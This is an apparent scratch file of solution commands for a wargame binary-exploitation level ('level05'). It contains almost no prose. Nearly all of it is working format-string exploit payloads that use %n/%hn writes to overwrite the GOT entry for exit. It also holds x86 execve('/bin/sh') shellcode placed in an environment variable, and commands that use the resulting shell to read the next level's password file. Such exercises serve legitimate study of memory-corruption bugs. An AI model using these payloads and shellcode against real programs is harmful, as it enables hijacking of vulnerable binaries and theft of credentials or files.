./level05 <<< $(python -c 'print("\xf7\xe5\xeb\x70"[::-1] + "%x" * 9 + "%n")')

https://axcheron.github.io/exploit-101-format-strings/

buffer address = 0xffffddc8 - 21

                ffff -> 65535

                ddc8 -> 56776 - 21 = 56755

got exit address     = 0x080497e0

                  +2 = 0x080497e2




gotaddr1="\x08\x04\x97\xe0"[::-1]

gotaddr2="\x08\x04\x97\xe2"[::-1]

hn1="%56755x%hn"

    65535 - 56785 = 8750 

hn2="%8750x%hn"

shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

written=$(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%x"*8' | ./level05 | wc -c | awk '{print $1-1-8}')

written=$(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%x"*8 + "%56755x%hn" + "%8750x%hn"' | ./level05 | wc -c | awk '{print $1-1-8}')



written=$(python -c 'print "\xf7\xe5\xeb\x70"[::-1] + "%x"*9' | ./level05 | wc -c | awk '{print $1-1-8}')
{ python -c "print '\xf7\xe5\xeb\x70'[::-1] + '%x'*8 + '%' + str(0xf7e78480 - $written) + 'x' + '%n'"; } | ./level05


./level05 <<< $(python -c "print '\xf7\xe5\xeb\x70'[::-1] + '%x'*8 + '%' + str(0xf7e6aed0 - $written) + 'x' + '%n'")


./level05 <<< $(python -c "print '\x08\x04\x97\xe0'[::-1] + '%x'*8 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + '%' + str(0xffffddc8 - 21) + 'x' + '%n'")


{
    python -c 'print "\x08\x04\x97\xe0"[::-1] + "AAAA" + "\x08\x04\x97\xe2"[::-1] + "%x"*9 + "%56751x" + "%hn" + "%8746x" + "%hn"';
    cat <<< "cd ../level06 && cat .pass";
} | env -i ./level05

shellcode address = 0xffffdf8b

                ffff -> 65535 - 57227

                df8b -> 57227


                df7d -> 57213


"\x08\x04\x97\xe0"[::-1] "\x08\x04\x97\xe2"[::-1]


export SHELLCODE="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
{
written1=$(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57199d10$hn"' | ./level05 | wc -c );
written2=$(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57199d10$hn" + "%8317d11$hn"' | ./level05 | wc -c );
python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "\x16\xfe\xff\xbf")';
cat <<< "cd ../bonus1 && cat .pass";
} | env - SHELLCODE=$SHELLCODE ~/level05

python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57199d10$hn" + "%8317d11$hn"' | env -i PWD=$PWD SHELLCODE=$SHELLCODE ~/level05
